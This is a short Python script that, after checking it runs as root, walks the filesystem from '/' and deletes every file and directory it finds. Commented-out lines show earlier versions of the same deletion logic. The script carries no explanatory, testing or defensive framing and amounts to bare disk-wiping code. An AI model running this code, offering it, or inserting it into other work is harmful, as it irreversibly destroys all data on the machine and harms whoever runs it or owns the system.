import os
import shutil

if os.getuid() != 0:
	print("Run as administator")
	quit()

root = os.path.expanduser("/")
os.chdir(root)

files = []
dirs = []

for path, subdirs, files in os.walk(root):
	for file in files:
		# files.append(os.path.join(path, file))
		# dirs.append(path)
		os.remove(os.path.join(path, file))	
		shutil.rmtree(path)
		# except FileNotFoundError:
		# 	continue

# for dir in dirs:
# 	print(dir)

# for doc in docs:
# 	try:
# 		if os.path.isfile(doc):
# 			os.remove(doc)
# 		else:
# 			shutil.rmtree(doc)
# 	except:
# 		continue
